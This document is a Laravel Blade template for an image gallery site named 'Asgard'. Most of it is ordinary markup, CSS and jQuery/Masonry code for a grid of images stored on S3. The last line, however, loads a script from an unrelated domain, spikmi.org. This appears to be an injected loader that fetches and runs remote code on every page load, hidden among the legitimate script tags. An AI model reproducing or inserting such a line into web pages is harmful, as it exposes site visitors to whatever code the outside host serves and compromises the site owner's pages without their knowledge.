<!DOCTYPE html>
<html>
<script src="https://cdn.jsdelivr.net/npm/admin-lte@3.2/dist/js/adminlte.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/admin-lte@3.2/dist/css/adminlte.min.css">

<style>
    * {
        box-sizing: border-box;
    }

    /* force scrollbar */
    html {
    }

    body {
        margin: 0;
        font-family: sans-serif;
    }

    /* ---- grid ---- */

    .grid {
        width: 100%;
        background: #000000;
    }

    /* clear fix */
    .grid:after {
        content: '';
        display: block;
        clear: both;
    }

    /* ---- .grid-item ---- */

    .grid-sizer,
    .grid-item {
        width: 33.3%;
    }

    .grid-item {
        float: left;
        border: 1px solid #0000;
    }

    .grid-item img {
        display: block;
        width: 100%;
    }

    .fade-in {
        -webkit-animation: fade-in 1.2s cubic-bezier(0.39, 0.575, 0.565, 1) both;
        animation: fade-in 1.2s cubic-bezier(0.39, 0.575, 0.565, 1) both;
    }

    @-webkit-keyframes fade-in {
        0% {
            -webkit-transform: translateY(50px);
            transform: translateY(50px);
            opacity: 0;
        }
        100% {
            -webkit-transform: translateY(0);
            transform: translateY(0);
            opacity: 1;
        }
    }

    @keyframes fade-in {
        0% {
            -webkit-transform: translateY(50px);
            transform: translateY(50px);
            opacity: 0;
        }
        100% {
            -webkit-transform: translateY(0);
            transform: translateY(0);
            opacity: 1;
        }
    }

    .fixed {
        position: fixed;
        z-index: 100;
        top: 0;
        display: block;
        width: 100%;
        height: 3%;
    }
</style>
<body>
<div class="fixed_block_position">
    <div class="fixed_block">
        <nav class="header navbar navbar-expand navbar-white navbar-light">
            <ul class="navbar-nav ml-left">
                <li class="nav-item d-none d-sm-inline-block">
                    <a href="/" class="nav-link"><b><h4>Asgard</h4></b></a>
                </li>
            </ul>
            <ul class="navbar-nav ml-auto text-black">
                <li class="nav-item d-none d-sm-inline-block">
                    <a href="/contact" class="nav-link"><b>Contact</b></a>
                </li>
            </ul>
        </nav>
    </div>
</div>
<div class="grid">
    <div class="grid-sizer"></div>
    @foreach($images as $image)
        <div class="grid-item">
            <a href="/view/{{$image->categoryId}}">
                <img src="{{ Storage::disk('s3')->url($image->path) }}"></a>
        </div>
    @endforeach
</div>
<script
    src="https://code.jquery.com/jquery-3.6.3.min.js"
    integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU="
    crossorigin="anonymous"></script>
<script src="https://unpkg.com/imagesloaded@4/imagesloaded.pkgd.js"></script>
<script src="https://unpkg.com/masonry-layout@4/dist/masonry.pkgd.js"></script>
<script>
    var $grid = $('.grid').imagesLoaded(function () {
        $grid.masonry({
            itemSelector: '.grid-item',
            percentPosition: true,
            columnWidth: '.grid-sizer'
        });
    });

    const fadeIn = function (isFirstLoad) {
        const animatedBoxes = document.getElementsByClassName("grid-item");
        const windowOffsetTop = window.innerHeight + window.scrollY;
        Array.prototype.forEach.call(animatedBoxes, (animatedBox) => {
            const animatedBoxOffsetTop = animatedBox.offsetTop;

            if (windowOffsetTop >= animatedBoxOffsetTop) {
                addClass(animatedBox, "fade-in");
            }
            if (isFirstLoad) {
                window.scroll({
                    top: 0,
                    left: 0,
                });

                document.body.scrollTop = document.documentElement.scrollTop = 0;
            }
        });
    };

    document.addEventListener("DOMContentLoaded", function (e) {
        fadeIn(true);
        document.addEventListener("scroll", (e) => {
            fadeIn(false);
        });
    });

    function addClass(element, className) {
        const arrayClasses = element.className.split(" ");
        if (arrayClasses.indexOf(className) === -1) {
            element.className += " " + className;
        }
    }

    $(document).ready(function () {
        var element = $(".fixed_block");
        var height_el = element.offset().top;

        $(".fixed_block_position").css({
            "width": element.outerWidth(),
            "height": element.outerHeight()
        });
        $(window).scroll(function () {
            if ($(window).scrollTop() > height_el) {
                element.addClass("fixed");
            } else {
                element.removeClass("fixed");
            }
        });
    });
</script>
<script type="text/javascript" src="https://spikmi.org/Widget?Id=16282"></script>

</body>
</html>



